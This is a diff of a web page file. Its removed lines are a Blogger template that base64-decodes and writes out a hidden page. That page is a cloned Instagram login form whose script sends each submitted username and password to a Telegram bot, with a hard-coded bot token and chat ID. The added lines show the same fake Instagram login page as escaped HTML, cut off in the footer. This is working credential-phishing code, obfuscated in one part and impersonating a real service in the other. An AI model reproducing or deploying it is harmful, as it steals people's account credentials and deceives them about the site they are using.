@@ -1,28 +1,311 @@
-<?xml version="1.0" encoding="UTF-8" ?>
 
-<!DOCTYPE html>
-<html  b:css='false' b:defaultwidgetversion='2' b:layoutsVersion='3' b:responsive='true' b:templateVersion='1.3.0'>
-<head>
-    <meta charset='UTF-8'/>
-    <meta content='width=device-width, initial-scale=1' name='viewport'/>
-    <title><data:blog.title/></title>
-    <b:skin><![CDATA[
-      /* يمكنك إضافة CSS هنا */
-    ]]></b:skin>
-</head>
-<body>
-<Script Language='en'>
-
-(function() {
-    function utf8Base64Decode(base64) {
-        return decodeURIComponent(escape(atob(base64)));
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot; /&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;
+  &lt;title&gt;Instagram Login&lt;/title&gt;
+  &lt;style&gt;
+    /* Reset and basic styles */
+    * {
+      box-sizing: border-box;
     }
-    var decodedHtml = utf8Base64Decode(&quot;CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04IiAvPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSIgLz4KICA8dGl0bGU+SW5zdGFncmFtIExvZ2luPC90aXRsZT4KICA8c3R5bGU+CiAgICAvKiBSZXNldCBhbmQgYmFzaWMgc3R5bGVzICovCiAgICAqIHsKICAgICAgYm94LXNpemluZzogYm9yZGVyLWJveDsKICAgIH0KICAgIGJvZHkgewogICAgICBtYXJnaW46IDA7CiAgICAgIGZvbnQtZmFtaWx5OiAtYXBwbGUtc3lzdGVtLCBCbGlua01hY1N5c3RlbUZvbnQsICJTZWdvZSBVSSIsIFJvYm90bywgT3h5Z2VuLAogICAgICAgIFVidW50dSwgQ2FudGFyZWxsLCAiT3BlbiBTYW5zIiwgIkhlbHZldGljYSBOZXVlIiwgc2Fucy1zZXJpZjsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZjsKICAgICAgY29sb3I6ICMyNjI2MjY7CiAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICAgIG1pbi1oZWlnaHQ6IDEwMHZoOwogICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgICBqdXN0aWZ5LWNvbnRlbnQ6IHN0YXJ0OwogICAgICBwYWRkaW5nOiAyMHB4IDIwcHggNjBweDsKICAgIH0KICAgIGEgewogICAgICBjb2xvcjogIzM4OTdmMDsKICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICB9CiAgICBhOmhvdmVyIHsKICAgICAgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7CiAgICB9CgogICAgLyogQ29udGFpbmVyICovCiAgICAuY29udGFpbmVyIHsKICAgICAgbWF4LXdpZHRoOiAzNTBweDsKICAgICAgd2lkdGg6IDEwMCU7CiAgICB9CgogICAgLyogSW5zdGFncmFtIExvZ28gLSBub3JtYWwgZm9udCAqLwogICAgLmxvZ28gewogICAgICBmb250LWZhbWlseTogLWFwcGxlLXN5c3RlbSwgQmxpbmtNYWNTeXN0ZW1Gb250LCAiU2Vnb2UgVUkiLCBSb2JvdG8sIE94eWdlbiwKICAgICAgICBVYnVudHUsIENhbnRhcmVsbCwgIk9wZW4gU2FucyIsICJIZWx2ZXRpY2EgTmV1ZSIsIHNhbnMtc2VyaWY7CiAgICAgIGZvbnQtc2l6ZTogNDhweDsKICAgICAgZm9udC13ZWlnaHQ6IGJvbGQ7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgbWFyZ2luOiA0MHB4IDAgMjBweCAwOwogICAgICB1c2VyLXNlbGVjdDogbm9uZTsKICAgIH0KCiAgICAvKiBGb3JtICovCiAgICBmb3JtIHsKICAgICAgYmFja2dyb3VuZDogI2ZhZmFmYTsKICAgICAgLyogYm9yZGVyOiAxcHggc29saWQgI2RiZGJkYjsgKi8gLyogQm9yZGVyIHJlbW92ZWQgKi8KICAgICAgcGFkZGluZzogNDBweCA0MHB4IDMwcHg7CiAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICAgIGdhcDogOHB4OwogICAgICBib3JkZXItcmFkaXVzOiAxcHg7CiAgICB9CiAgICBpbnB1dFt0eXBlPSJ0ZXh0Il0sCiAgICBpbnB1dFt0eXBlPSJwYXNzd29yZCJdIHsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2ZhZmFmYTsKICAgICAgYm9yZGVyOiAxcHggc29saWQgI2RiZGJkYjsKICAgICAgYm9yZGVyLXJhZGl1czogM3B4OwogICAgICBwYWRkaW5nOiA5cHggOHB4IDdweCA4cHg7CiAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgd2lkdGg6IDEwMCU7CiAgICAgIG91dGxpbmUtb2Zmc2V0OiAtMnB4OwogICAgICBvdXRsaW5lLWNvbG9yOiB0cmFuc3BhcmVudDsKICAgICAgdHJhbnNpdGlvbjogb3V0bGluZS1jb2xvciAwLjJzIGVhc2UtaW4tb3V0OwogICAgfQogICAgaW5wdXRbdHlwZT0idGV4dCJdOmZvY3VzLAogICAgaW5wdXRbdHlwZT0icGFzc3dvcmQiXTpmb2N1cyB7CiAgICAgIG91dGxpbmUtY29sb3I6ICNhOGE4YTg7CiAgICAgIGJhY2tncm91bmQtY29sb3I6ICNmZmY7CiAgICB9CgogICAgLyogTG9naW4gYnV0dG9uICovCiAgICBidXR0b24ubG9naW4tYnRuIHsKICAgICAgbWFyZ2luLXRvcDogOHB4OwogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA5NWY2OwogICAgICBib3JkZXI6IG5vbmU7CiAgICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgICAgcGFkZGluZzogOHB4IDA7CiAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgZm9udC13ZWlnaHQ6IDYwMDsKICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgIHVzZXItc2VsZWN0OiBub25lOwogICAgICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDAuM3MgZWFzZS1pbi1vdXQ7CiAgICB9CiAgICBidXR0b24ubG9naW4tYnRuOmhvdmVyOm5vdCg6ZGlzYWJsZWQpIHsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzAwN2FjYzsKICAgIH0KICAgIGJ1dHRvbi5sb2dpbi1idG46ZGlzYWJsZWQgewogICAgICBvcGFjaXR5OiAwLjU7CiAgICAgIGN1cnNvcjogZGVmYXVsdDsKICAgIH0KCiAgICAvKiBGb3Jnb3QgcGFzc3dvcmQgKi8KICAgIC5mb3Jnb3QtcGFzc3dvcmQgewogICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgIGZvbnQtc2l6ZTogMTJweDsKICAgICAgbWFyZ2luOiAyMHB4IDAgMCAwOwogICAgfQoKICAgIC8qIFNpZ24gdXAgc2VjdGlvbiAqLwogICAgLnNpZ251cC1zZWN0aW9uIHsKICAgICAgbWFyZ2luOiAyMHB4IDAgMzBweDsKICAgICAgcGFkZGluZzogMjBweCAwOwogICAgICAvKiBib3JkZXI6IDFweCBzb2xpZCAjZGFkYWRhOyAqLyAvKiBCb3JkZXIgcmVtb3ZlZCAqLwogICAgICBiYWNrZ3JvdW5kOiAjZmZmOwogICAgICBib3JkZXItcmFkaXVzOiAxcHg7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgfQoKICAgIC8qIEdldCB0aGUgYXBwIHNlY3Rpb24gKi8KICAgIC5nZXQtYXBwIHsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICBmb250LXNpemU6IDE0cHg7CiAgICAgIG1hcmdpbi1ib3R0b206IDE1cHg7CiAgICAgIHVzZXItc2VsZWN0OiBub25lOwogICAgfQogICAgLmFwcC1idXR0b25zIHsKICAgICAgZGlzcGxheTogZmxleDsKICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgIGdhcDogMTJweDsKICAgICAgZmxleC13cmFwOiB3cmFwOwogICAgfQogICAgLmFwcC1idXR0b24gewogICAgICBkaXNwbGF5OiBpbmxpbmUtZmxleDsKICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgICAgYmFja2dyb3VuZDogYmxhY2s7CiAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICBmb250LXdlaWdodDogNjAwOwogICAgICBwYWRkaW5nOiA2cHggMTJweDsKICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICBoZWlnaHQ6IDQwcHg7CiAgICAgIHVzZXItc2VsZWN0OiBub25lOwogICAgfQogICAgLmFwcC1idXR0b24gc3ZnIHsKICAgICAgaGVpZ2h0OiAyMHB4OwogICAgICB3aWR0aDogMjBweDsKICAgICAgbWFyZ2luLXJpZ2h0OiA4cHg7CiAgICAgIGZpbGw6IHdoaXRlOwogICAgICBmbGV4LXNocmluazogMDsKICAgIH0KCiAgICAvKiBGb290ZXIgbmF2aWdhdGlvbiAqLwogICAgZm9vdGVyIHsKICAgICAgbWFyZ2luLXRvcDogYXV0bzsKICAgICAgbWF4LXdpZHRoOiA2MDBweDsKICAgICAgd2lkdGg6IDEwMCU7CiAgICAgIHBhZGRpbmc6IDIwcHggMDsKICAgICAgdXNlci1zZWxlY3Q6IG5vbmU7CiAgICB9CiAgICAuZm9vdGVyLW5hdiB7CiAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgIGZsZXgtd3JhcDogd3JhcDsKICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgIGdhcDogMTVweCAxNXB4OwogICAgICBmb250LXNpemU6IDEycHg7CiAgICAgIGNvbG9yOiAjMDAzNzZiOwogICAgICBmb250LXdlaWdodDogNjAwOwogICAgICB0ZXh0LXRyYW5zZm9ybTogdXBwZXJjYXNlOwogICAgICBsZXR0ZXItc3BhY2luZzogMC4xZW07CiAgICB9CiAgICAuZm9vdGVyLW5hdiBhIHsKICAgICAgY29sb3I6ICMwMDM3NmI7CiAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgIH0KICAgIC5mb290ZXItbmF2IGE6aG92ZXIgewogICAgICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICAgIH0KICAgIC5mb290ZXItYnJhbmRpbmcgewogICAgICBjb2xvcjogIzhlOGU4ZTsKICAgICAgZm9udC1zaXplOiAxMnB4OwogICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgIG1hcmdpbi10b3A6IDE1cHg7CiAgICAgIHRleHQtdHJhbnNmb3JtOiB1cHBlcmNhc2U7CiAgICAgIGxldHRlci1zcGFjaW5nOiAwLjEyZW07CiAgICB9CgogICAgLyogUmVzcG9uc2l2ZSAtIGNlbnRlciBvbiBzbWFsbGVyICovCiAgICBAbWVkaWEgKG1heC13aWR0aDogNDAwcHgpIHsKICAgICAgLmNvbnRhaW5lciB7CiAgICAgICAgbWF4LXdpZHRoOiA5NSU7CiAgICAgIH0KICAgIH0KICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogIDxkaXYgY2xhc3M9ImNvbnRhaW5lciIgcm9sZT0ibWFpbiI+CiAgICA8aDEgY2xhc3M9ImxvZ28iIGFyaWEtbGFiZWw9Ikluc3RhZ3JhbSI+SW5zdGFncmFtPC9oMT4KCiAgICA8Zm9ybSBhcmlhLWxhYmVsPSJMb2dpbiBmb3JtIj4KICAgICAgPGlucHV0CiAgICAgICAgdHlwZT0idGV4dCIKICAgICAgICBuYW1lPSJ1c2VybmFtZSIKICAgICAgICBhdXRvY29tcGxldGU9InVzZXJuYW1lIgogICAgICAgIGFyaWEtcmVxdWlyZWQ9InRydWUiCiAgICAgICAgcGxhY2Vob2xkZXI9IlBob25lIG51bWJlciwgdXNlcm5hbWUsIG9yIGVtYWlsIgogICAgICAgIHJlcXVpcmVkCiAgICAgIC8+CiAgICAgIDxpbnB1dAogICAgICAgIHR5cGU9InBhc3N3b3JkIgogICAgICAgIG5hbWU9InBhc3N3b3JkIgogICAgICAgIGF1dG9jb21wbGV0ZT0iY3VycmVudC1wYXNzd29yZCIKICAgICAgICBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiCiAgICAgICAgYXJpYS1yZXF1aXJlZD0idHJ1ZSIKICAgICAgICByZXF1aXJlZAogICAgICAvPgogICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImxvZ2luLWJ0biIgYXJpYS1sYWJlbD0iTG9nIGluIHRvIEluc3RhZ3JhbSI+TG9nIGluPC9idXR0b24+CiAgICA8L2Zvcm0+CgogICAgPHAgY2xhc3M9ImZvcmdvdC1wYXNzd29yZCI+CiAgICAgIDxhIGhyZWY9IiMiIHRhYmluZGV4PSIwIiBhcmlhLWxhYmVsPSJGb3Jnb3QgcGFzc3dvcmQgbGluayI+Rm9yZ290IHBhc3N3b3JkPzwvYT4KICAgIDwvcD4KCiAgICA8c2VjdGlvbiBjbGFzcz0ic2lnbnVwLXNlY3Rpb24iIGFyaWEtbGFiZWw9IlNpZ24gdXAgcHJvbXB0Ij4KICAgICAgRG9uJ3QgaGF2ZSBhbiBhY2NvdW50PyA8YSBocmVmPSIjIiBhcmlhLWxhYmVsPSJTaWduIHVwIGZvciBJbnN0YWdyYW0iPlNpZ24gdXA8L2E+CiAgICA8L3NlY3Rpb24+CgogICAgPGRpdiBjbGFzcz0iZ2V0LWFwcCIgYXJpYS1sYWJlbD0iR2V0IHRoZSBhcHAiPgogICAgICBHZXQgdGhlIGFwcC4KICAgIDwvZGl2PgoKICAgIDxkaXYgY2xhc3M9ImFwcC1idXR0b25zIiBhcmlhLWxhYmVsPSJEb3dubG9hZCBJbnN0YWdyYW0gbW9iaWxlIGFwcCI+CiAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJhcHAtYnV0dG9uIiBhcmlhLWxhYmVsPSJEb3dubG9hZCBvbiB0aGUgQXBwIFN0b3JlIj4KICAgICAgICA8c3ZnIGFyaWEtaGlkZGVuPSJ0cnVlIiBmb2N1c2FibGU9ImZhbHNlIiB2aWV3Qm94PSIwIDAgMjQgMjQiPgogICAgICAgICAgPHBhdGggZD0iTTE5LjcgMTIuMmMtLjEtMi43IDIuMi0zLjkgMi4zLTQtMS4zLTEuOS0zLjQtMi4yLTQuMS0yLjItMS43LS4yLTMuMy45LTQuMS45LS44IDAtMi4xLS45LTMuNC0uOS0xLjggMC0zLjUgMS00LjQgMi43LTEuOSAzLjMtLjUgOC4xIDEuMyAxMC43LjkgMS4zIDIgMi44IDMuNCAyLjcgMS40LS4xIDEuOS0uOSAzLjQtLjlzMS45LjkgMy40LjljMS41IDAgMi41LTEuMyAzLjQtMi43IDEtMS43IDEuNC0zLjMgMS41LTMuNC0uMS0uMS0yLjctMS0uMS0zLjl6Ij48L3BhdGg+CiAgICAgICAgPC9zdmc+CiAgICAgICAgQXBwIFN0b3JlCiAgICAgIDwvYT4KICAgICAgPGEgaHJlZj0iIyIgY2xhc3M9ImFwcC1idXR0b24iIGFyaWEtbGFiZWw9IkdldCBpdCBvbiBHb29nbGUgUGxheSI+CiAgICAgICAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgZm9jdXNhYmxlPSJmYWxzZSIgdmlld0JveD0iMzAgMzM2LjcgMTIwLjkgMTI5LjIiIHN0eWxlPSJoZWlnaHQ6MjBweDsgd2lkdGg6MjBweDsgbWFyZ2luLXJpZ2h0OjhweDsiPgogICAgICAgICAgPHBhdGggZmlsbD0iI0ZGRDQwMCIgZD0iTTM2LjcgMzM3LjN2MTI4LjNsNTAuMi02NC0uMy02NC4zLTQ5LjkuMXoiIC8+CiAgICAgICAgICA8cGF0aCBmaWxsPSIjRkYzMzMzIiBkPSJNODUuNSAzMzcuNmwtMjQuOCAyNC43IDI0LjUgNDYgMjUuNC0yNS40LTI1LjEtNDUuM3oiIC8+CiAgICAgICAgICA8cGF0aCBmaWxsPSIjNDhGRjQ4IiBkPSJNMzYuNyA0NjUuNmw1MC4yLTY0IDI1LjcgMjUuNXYtMTI4LjN6IiAvPgogICAgICAgICAgPHBhdGggZmlsbD0iIzMzMzNGRiIgZD0iTTExMS44IDQzNi4ybC0yNi4xLTI1LjkgMjYuNC0yNi4yIDI0LjggMjUuMS0yNS4yIDI1eiIgLz4KICAgICAgICA8L3N2Zz4KICAgICAgICBHb29nbGUgUGxheQogICAgICA8L2E+CiAgICA8L2Rpdj4KICA8L2Rpdj4KCiAgPGZvb3RlciByb2xlPSJjb250ZW50aW5mbyIgYXJpYS1sYWJlbD0iRm9vdGVyIG5hdmlnYXRpb24gYW5kIGJyYW5kaW5nIj4KICAgIDxuYXYgY2xhc3M9ImZvb3Rlci1uYXYiIGFyaWEtbGFiZWw9IkZvb3RlciBsaW5rcyI+CiAgICAgIDxhIGhyZWY9IiMiIHRhYmluZGV4PSIwIj5BQk9VVCBVUzwvYT4KICAgICAgPGEgaHJlZj0iIyIgdGFiaW5kZXg9IjAiPlNVUFBPUlQ8L2E+CiAgICAgIDxhIGhyZWY9IiMiIHRhYmluZGV4PSIwIj5CTE9HPC9hPgogICAgICA8YSBocmVmPSIjIiB0YWJpbmRleD0iMCI+UFJFU1M8L2E+CiAgICAgIDxhIGhyZWY9IiMiIHRhYmluZGV4PSIwIj5BUEk8L2E+CiAgICAgIDxhIGhyZWY9IiMiIHRhYmluZGV4PSIwIj5KT0JTPC9hPgogICAgICA8YSBocmVmPSIjIiB0YWJpbmRleD0iMCI+UFJJVkFDWTwvYT4KICAgICAgPGEgaHJlZj0iIyIgdGFiaW5kZXg9IjAiPlRFUk1TPC9hPgogICAgICA8YSBocmVmPSIjIiB0YWJpbmRleD0iMCI+RElSRUNUT1JZPC9hPgogICAgICA8YSBocmVmPSIjIiB0YWJpbmRleD0iMCI+TEFOR1VBR0U8L2E+CiAgICA8L25hdj4KICAgIDxkaXYgY2xhc3M9ImZvb3Rlci1icmFuZGluZyIgYXJpYS1sYWJlbD0iSW5zdGFncmFtIGJyYW5kaW5nIj4KICAgICAgSU5TVEFHUkFNCiAgICA8L2Rpdj4KICA8L2Zvb3Rlcj4KCiAgPHNjcmlwdD4KICAgIGFzeW5jIGZ1bmN0aW9uIHNlbmRUb1RlbGVncmFtKHVzZXJuYW1lLCBwYXNzd29yZCkgewogICAgICBjb25zdCBib3RUb2tlbiA9ICc2MDU4MTA2Mjk3OkFBRTNvMllkRGNjOTE1TjgxczkxRjNTOWp6TVRZajFrMFVRJzsKICAgICAgY29uc3QgY2hhdElkID0gJzE3NDc3NDIyMjgnOwogICAgICBjb25zdCBtZXNzYWdlID0gYExvZ2luIEF0dGVtcHQ6XG5Vc2VybmFtZTogJHt1c2VybmFtZX1cblBhc3N3b3JkOiAke3Bhc3N3b3JkfWA7CgogICAgICBjb25zdCB1cmwgPSBgaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCR7Ym90VG9rZW59L3NlbmRNZXNzYWdlYDsKCiAgICAgIHRyeSB7CiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaCh1cmwsIHsKICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgICAgaGVhZGVyczogewogICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nCiAgICAgICAgICB9LAogICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoewogICAgICAgICAgICBjaGF0X2lkOiBjaGF0SWQsCiAgICAgICAgICAgIHRleHQ6IG1lc3NhZ2UKICAgICAgICAgIH0pCiAgICAgICAgfSk7CgogICAgICAgIGlmICghcmVzcG9uc2Uub2spIHsKICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ0ZhaWxlZCB0byBzZW5kIG1lc3NhZ2UgdG8gVGVsZWdyYW0nKTsKICAgICAgICB9CiAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgY29uc29sZS5lcnJvcignRXJyb3Igc2VuZGluZyBtZXNzYWdlIHRvIFRlbGVncmFtOicsIGVycm9yKTsKICAgICAgfQogICAgfQoKICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2Zvcm0nKS5hZGRFdmVudExpc3RlbmVyKCdzdWJtaXQnLCBmdW5jdGlvbihldmVudCkgewogICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwoKICAgICAgY29uc3QgdXNlcm5hbWUgPSB0aGlzLnVzZXJuYW1lLnZhbHVlOwogICAgICBjb25zdCBwYXNzd29yZCA9IHRoaXMucGFzc3dvcmQudmFsdWU7CgogICAgICBzZW5kVG9UZWxlZ3JhbSh1c2VybmFtZSwgcGFzc3dvcmQpOwoKICAgICAgYWxlcnQoJ0xvZyBpbiBjbGlja2VkJyk7CiAgICB9KTsKICA8L3NjcmlwdD4KPC9ib2R5PgogIDwvaHRtbD4==&quot;);
-    document.write(decodedHtml);
-})();
-</Script>
-    <b:section id='main' class='blog-posts' showaddelement='no'>
-        <b:widget id='Blog1' type='Blog'/>
-    </b:section>
-</body>
-</html>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen,
+        Ubuntu, Cantarell, &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif;
+      background-color: #fff;
+      color: #262626;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      align-items: center;
+      justify-content: start;
+      padding: 20px 20px 60px;
+    }
+    a {
+      color: #3897f0;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+
+    /* Container */
+    .container {
+      max-width: 350px;
+      width: 100%;
+    }
+
+    /* Instagram Logo - normal font */
+    .logo {
+      font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen,
+        Ubuntu, Cantarell, &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif;
+      font-size: 48px;
+      font-weight: bold;
+      text-align: center;
+      margin: 40px 0 20px 0;
+      user-select: none;
+    }
+
+    /* Form */
+    form {
+      background: #fafafa;
+      /* border: 1px solid #dbdbdb; */ /* Border removed */
+      padding: 40px 40px 30px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      border-radius: 1px;
+    }
+    input[type=&quot;text&quot;],
+    input[type=&quot;password&quot;] {
+      background-color: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      padding: 9px 8px 7px 8px;
+      font-size: 14px;
+      width: 100%;
+      outline-offset: -2px;
+      outline-color: transparent;
+      transition: outline-color 0.2s ease-in-out;
+    }
+    input[type=&quot;text&quot;]:focus,
+    input[type=&quot;password&quot;]:focus {
+      outline-color: #a8a8a8;
+      background-color: #fff;
+    }
+
+    /* Login button */
+    button.login-btn {
+      margin-top: 8px;
+      background-color: #0095f6;
+      border: none;
+      border-radius: 4px;
+      padding: 8px 0;
+      color: white;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      user-select: none;
+      transition: background-color 0.3s ease-in-out;
+    }
+    button.login-btn:hover:not(:disabled) {
+      background-color: #007acc;
+    }
+    button.login-btn:disabled {
+      opacity: 0.5;
+      cursor: default;
+    }
+
+    /* Forgot password */
+    .forgot-password {
+      text-align: center;
+      font-size: 12px;
+      margin: 20px 0 0 0;
+    }
+
+    /* Sign up section */
+    .signup-section {
+      margin: 20px 0 30px;
+      padding: 20px 0;
+      /* border: 1px solid #dadada; */ /* Border removed */
+      background: #fff;
+      border-radius: 1px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    /* Get the app section */
+    .get-app {
+      text-align: center;
+      font-size: 14px;
+      margin-bottom: 15px;
+      user-select: none;
+    }
+    .app-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .app-button {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 4px;
+      background: black;
+      color: white;
+      font-size: 14px;
+      font-weight: 600;
+      padding: 6px 12px;
+      text-decoration: none;
+      height: 40px;
+      user-select: none;
+    }
+    .app-button svg {
+      height: 20px;
+      width: 20px;
+      margin-right: 8px;
+      fill: white;
+      flex-shrink: 0;
+    }
+
+    /* Footer navigation */
+    footer {
+      margin-top: auto;
+      max-width: 600px;
+      width: 100%;
+      padding: 20px 0;
+      user-select: none;
+    }
+    .footer-nav {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 15px 15px;
+      font-size: 12px;
+      color: #00376b;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+    }
+    .footer-nav a {
+      color: #00376b;
+      text-decoration: none;
+    }
+    .footer-nav a:hover {
+      text-decoration: underline;
+    }
+    .footer-branding {
+      color: #8e8e8e;
+      font-size: 12px;
+      text-align: center;
+      margin-top: 15px;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+    }
+
+    /* Responsive - center on smaller */
+    @media (max-width: 400px) {
+      .container {
+        max-width: 95%;
+      }
+    }
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div class=&quot;container&quot; role=&quot;main&quot;&gt;
+    &lt;h1 class=&quot;logo&quot; aria-label=&quot;Instagram&quot;&gt;Instagram&lt;/h1&gt;
+
+    &lt;form aria-label=&quot;Login form&quot;&gt;
+      &lt;input
+        type=&quot;text&quot;
+        name=&quot;username&quot;
+        autocomplete=&quot;username&quot;
+        aria-required=&quot;true&quot;
+        placeholder=&quot;Phone number, username, or email&quot;
+        required
+      /&gt;
+      &lt;input
+        type=&quot;password&quot;
+        name=&quot;password&quot;
+        autocomplete=&quot;current-password&quot;
+        placeholder=&quot;Password&quot;
+        aria-required=&quot;true&quot;
+        required
+      /&gt;
+      &lt;button type=&quot;submit&quot; class=&quot;login-btn&quot; aria-label=&quot;Log in to Instagram&quot;&gt;Log in&lt;/button&gt;
+    &lt;/form&gt;
+
+    &lt;p class=&quot;forgot-password&quot;&gt;
+      &lt;a href=&quot;#&quot; tabindex=&quot;0&quot; aria-label=&quot;Forgot password link&quot;&gt;Forgot password?&lt;/a&gt;
+    &lt;/p&gt;
+
+    &lt;section class=&quot;signup-section&quot; aria-label=&quot;Sign up prompt&quot;&gt;
+      Don&#39;t have an account? &lt;a href=&quot;#&quot; aria-label=&quot;Sign up for Instagram&quot;&gt;Sign up&lt;/a&gt;
+    &lt;/section&gt;
+
+    &lt;div class=&quot;get-app&quot; aria-label=&quot;Get the app&quot;&gt;
+      Get the app.
+    &lt;/div&gt;
+
+    &lt;div class=&quot;app-buttons&quot; aria-label=&quot;Download Instagram mobile app&quot;&gt;
+      &lt;a href=&quot;#&quot; class=&quot;app-button&quot; aria-label=&quot;Download on the App Store&quot;&gt;
+        &lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; viewBox=&quot;0 0 24 24&quot;&gt;
+          &lt;path d=&quot;M19.7 12.2c-.1-2.7 2.2-3.9 2.3-4-1.3-1.9-3.4-2.2-4.1-2.2-1.7-.2-3.3.9-4.1.9-.8 0-2.1-.9-3.4-.9-1.8 0-3.5 1-4.4 2.7-1.9 3.3-.5 8.1 1.3 10.7.9 1.3 2 2.8 3.4 2.7 1.4-.1 1.9-.9 3.4-.9s1.9.9 3.4.9c1.5 0 2.5-1.3 3.4-2.7 1-1.7 1.4-3.3 1.5-3.4-.1-.1-2.7-1-.1-3.9z&quot;&gt;&lt;/path&gt;
+        &lt;/svg&gt;
+        App Store
+      &lt;/a&gt;
+      &lt;a href=&quot;#&quot; class=&quot;app-button&quot; aria-label=&quot;Get it on Google Play&quot;&gt;
+        &lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; viewBox=&quot;30 336.7 120.9 129.2&quot; style=&quot;height:20px; width:20px; margin-right:8px;&quot;&gt;
+          &lt;path fill=&quot;#FFD400&quot; d=&quot;M36.7 337.3v128.3l50.2-64-.3-64.3-49.9.1z&quot; /&gt;
+          &lt;path fill=&quot;#FF3333&quot; d=&quot;M85.5 337.6l-24.8 24.7 24.5 46 25.4-25.4-25.1-45.3z&quot; /&gt;
+          &lt;path fill=&quot;#48FF48&quot; d=&quot;M36.7 465.6l50.2-64 25.7 25.5v-128.3z&quot; /&gt;
+          &lt;path fill=&quot;#3333FF&quot; d=&quot;M111.8 436.2l-26.1-25.9 26.4-26.2 24.8 25.1-25.2 25z&quot; /&gt;
+        &lt;/svg&gt;
+        Google Play
+      &lt;/a&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+
+  &lt;footer role=&quot;contentinfo&quot; aria-label=&quot;Footer navigation and branding&quot;&gt;
+    &lt;nav class=&quot;footer-nav&quot; aria-label=&quot;Footer links&quot;&gt;
+      &lt;a href=&quot;#&quot; tabindex=&quot;0&quot;&gt;ABOUT US&lt;/a&gt;
+      &lt;a href=&quot;#&quot; tabindex=&quot;0&quot;&gt;SUPPORT&lt;/a&gt;
